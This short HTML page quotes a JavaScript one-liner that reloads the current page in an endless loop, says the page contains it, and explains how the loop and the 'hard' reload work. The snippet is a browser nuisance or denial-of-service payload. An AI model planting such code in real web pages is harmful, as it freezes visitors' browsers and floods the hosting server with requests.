<h1>This page contain this code : setTimeout(() => { while (1) location.reload(1); }, 100);</h1>

<h1>This little script creates an infinite loop that continuously refreshes the current web page. <br> It uses a while loop with the condition 1, which is always true, causing the code inside the loop to execute indefinitely.<br> Inside the loop, it calls location.reload(1) to reload the current page. The argument 1 passed to location.reload indicates a "hard" reload, which means the page is reloaded from the server rather than using cached resources.</h1>
